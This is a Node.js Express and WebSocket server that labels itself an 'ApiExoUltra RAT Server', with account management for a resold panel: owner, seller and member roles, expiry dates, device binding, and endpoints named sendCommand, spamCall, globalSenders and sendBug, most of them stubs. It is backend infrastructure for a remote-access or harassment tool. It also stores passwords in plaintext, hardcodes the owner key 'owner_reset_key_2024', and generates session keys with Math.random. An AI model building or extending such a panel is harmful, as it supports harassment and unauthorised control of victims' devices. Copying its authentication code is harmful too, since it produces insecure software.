const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = 2014;
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/apoexultra';

// ─── MongoDB Schema ───────────────────────────────────────────
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['owner', 'admin', 'member', 'seller'], default: 'member' },
  key: { type: String, unique: true },
  expiredDate: { type: String },
  androidId: { type: String, default: '' },
  activeSession: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now },
});

const User = mongoose.model('User', userSchema);

// ─── Panel State ──────────────────────────────────────────────
let panelConnections = new Map();
let panelActive = true;
let dbAvailable = false;

function generateKey() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function isOwner(req) {
  const key = req.query.key || req.body?.key;
  return key === 'owner_reset_key_2024';
}

// ─── REST API ─────────────────────────────────────────────────

app.get('/', (req, res) => {
  res.json({ status: 'ok', server: 'ApiExoUltra RAT Server', version: '2.0' });
});

app.post('/validate', async (req, res) => {
  try {
    if (!dbAvailable) {
      return res.json({ valid: false, message: 'Database not available.' });
    }
    const { username, password, androidId } = req.body;
    const user = await User.findOne({ username, password }).maxTimeMS(2000);
    if (!user) {
      return res.json({ valid: false, message: 'Username atau password salah.' });
    }
    const now = new Date();
    if (user.expiredDate && new Date(user.expiredDate) < now) {
      return res.json({ valid: true, expired: true, message: 'Masa akses telah habis.' });
    }
    if (user.activeSession && user.androidId && user.androidId !== androidId) {
      return res.json({ valid: false, message: 'Akun sedang login di perangkat lain.' });
    }
    const key = generateKey();
    user.key = key;
    user.androidId = androidId || '';
    user.activeSession = true;
    await user.save();
    res.json({
      valid: true,
      key,
      role: user.role,
      expiredDate: user.expiredDate || '',
      listBug: [],
      news: [],
    });
  } catch (e) {
    res.status(500).json({ valid: false, message: 'Server error.' });
  }
});

app.get('/myInfo', async (req, res) => {
  try {
    const { username, password, key, androidId } = req.query;
    const user = await User.findOne({ username, password, key });
    if (!user) {
      return res.json({ valid: false, message: 'Invalid session.' });
    }
    res.json({
      valid: true,
      key: user.key,
      role: user.role,
      expiredDate: user.expiredDate || '',
      listBug: [],
      news: [],
    });
  } catch (e) {
    res.status(500).json({ valid: false });
  }
});

app.post('/changepass', async (req, res) => {
  try {
    const { username, password, newPassword, key } = req.body;
    const user = await User.findOne({ username, password, key });
    if (!user) return res.json({ valid: false, message: 'Invalid session.' });
    user.password = newPassword;
    await user.save();
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false });
  }
});

app.post('/sendBug', (req, res) => {
  res.json({ valid: true, message: 'Bug sent.' });
});

app.post('/createAccount', async (req, res) => {
  try {
    const { username, password, role, expiredDate, key } = req.body;
    if (!isOwner(req)) return res.json({ valid: false, message: 'Unauthorized.' });
    const exists = await User.findOne({ username });
    if (exists) return res.json({ valid: false, message: 'Username already exists.' });
    await User.create({ username, password, role: role || 'member', expiredDate: expiredDate || '', key: generateKey() });
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false });
  }
});

app.get('/deleteUser', async (req, res) => {
  try {
    if (!isOwner(req)) return res.json({ valid: false, message: 'Unauthorized.' });
    await User.deleteOne({ username: req.query.username });
    res.json({ valid: true });
  } catch (e) {
    res.status(500).json({ valid: false });
  }
});

app.get('/mySender', async (req, res) => {
  const key = req.query.key;
  const user = await User.findOne({ key });
  if (!user) return res.json({ valid: false });
  res.json({
    valid: true,
    privateConnections: [],
    globalConnections: [],
  });
});

app.post('/addServer', (req, res) => res.json({ valid: true }));
app.get('/delServer', (req, res) => res.json({ valid: true }));
app.get('/myServer', (req, res) => res.json({ valid: true, servers: [] }));

app.post('/sendCommand', (req, res) => {
  res.json({ valid: true, message: 'Command sent.' });
});

app.post('/spamCall', (req, res) => {
  res.json({ valid: true, message: 'Spam call started.' });
});

app.get('/getInfo', (req, res) => {
  res.json({
    valid: true,
    info: {
      server: 'ApiExoUltra RAT Server v2.0',
      uptime: process.uptime(),
      panelActive,
      connections: panelConnections.size,
    },
  });
});

app.get('/listUsers', async (req, res) => {
  try {
    if (!isOwner(req)) return res.json({ valid: false, message: 'Unauthorized.' });
    const users = await User.find({}, { password: 0, key: 0 });
    res.json({ valid: true, users });
  } catch (e) {
    res.status(500).json({ valid: false });
  }
});

app.get('/getOnlineUsers', async (req, res) => {
  try {
    const online = await User.countDocuments({ activeSession: true });
    res.json({ valid: true, onlineUsers: online });
  } catch (e) {
    res.json({ valid: true, onlineUsers: 0 });
  }
});

app.get('/api/news', (req, res) => {
  res.json({ valid: true, news: [] });
});

app.get('/getPairing', (req, res) => {
  res.json({ valid: true, code: 'PAIR-0000' });
});

// ─── Global Sender Endpoints ──────────────────────────────────
app.get('/globalSenders', (req, res) => res.json({ valid: true, senders: [] }));
app.post('/addGlobalSender', (req, res) => res.json({ valid: true }));
app.post('/confirmGlobalSender', (req, res) => res.json({ valid: true }));
app.get('/deleteGlobalSender', (req, res) => res.json({ valid: true }));

// ─── Chat Global Endpoints ────────────────────────────────────
app.get('/getChatRooms', (req, res) => res.json({ valid: true, rooms: [] }));
app.get('/getChatUsers', (req, res) => res.json({ valid: true, users: [] }));
app.get('/getChatMessages', (req, res) => res.json({ valid: true, messages: [] }));
app.post('/sendChatMessage', (req, res) => res.json({ valid: true }));
app.post('/uploadChatMedia', (req, res) => res.json({ valid: true }));

// ═══════════════════════════════════════════════════════════════
//  /resetpanel  — Reset all panel connections (owner only)
// ═══════════════════════════════════════════════════════════════
app.post('/resetpanel', async (req, res) => {
  const { key } = req.body;

  if (dbAvailable) {
    const user = key ? await User.findOne({ key }).maxTimeMS(2000) : null;
    if (!user || user.role !== 'owner') {
      return res.json({ valid: false, message: 'Only owner can reset panel.' });
    }
  } else if (key !== 'owner_reset_key_2024') {
    return res.json({ valid: false, message: 'Only owner can reset panel.' });
  }

  panelActive = false;

  for (const [id, ws] of panelConnections) {
    try { ws.close(1001, 'Panel reset by owner'); } catch (_) {}
  }
  panelConnections.clear();

  panelActive = true;

  res.json({
    valid: true,
    message: 'Panel reset successful. All connections terminated.',
    timestamp: new Date().toISOString(),
  });
});

// ─── WebSocket ────────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const id = Math.random().toString(36).substring(2, 10);
  panelConnections.set(id, ws);

  ws.on('message', (raw) => {
    try {
      const data = JSON.parse(raw.toString());

      if (data.type === 'validate') {
        ws.send(JSON.stringify({
          type: 'myInfo',
          valid: true,
          key: data.key,
        }));
      }

      if (data.type === 'stats') {
        ws.send(JSON.stringify({
          type: 'stats',
          onlineUsers: panelConnections.size,
          totalUsers: 0,
          totalBugs: 0,
        }));
      }

      if (data.type === 'get_online_users') {
        ws.send(JSON.stringify({
          type: 'online_users',
          users: Array.from(panelConnections.keys()).length,
        }));
      }
    } catch (_) {}
  });

  ws.on('close', () => {
    panelConnections.delete(id);
  });

  ws.on('error', () => {
    panelConnections.delete(id);
  });

  ws.send(JSON.stringify({ type: 'connected', id }));
});

// ─── Broadcast helper (for future use) ────────────────────────
function broadcast(data) {
  const msg = JSON.stringify(data);
  for (const [id, ws] of panelConnections) {
    try { ws.send(msg); } catch (_) { panelConnections.delete(id); }
  }
}

// ─── Periodic cleanup ─────────────────────────────────────────
setInterval(() => {
  for (const [id, ws] of panelConnections) {
    if (ws.readyState !== 1) panelConnections.delete(id);
  }
}, 30000);

// ─── Start Server ─────────────────────────────────────────────
async function start() {
  try {
    await mongoose.connect(MONGO_URI, {
      serverSelectionTimeoutMS: 3000,
      connectTimeoutMS: 3000,
    });
    dbAvailable = true;
    console.log('[DB] MongoDB connected');
  } catch (e) {
    console.log('[DB] MongoDB not available, running in memory mode');
  }

  server.listen(PORT, () => {
    console.log('====================================');
    console.log('  ApiExoUltra RAT Server v2.0');
    console.log(`  Running on port ${PORT}`);
    console.log('  Panel reset: POST/GET /resetpanel');
    console.log('====================================');
  });
}

start();
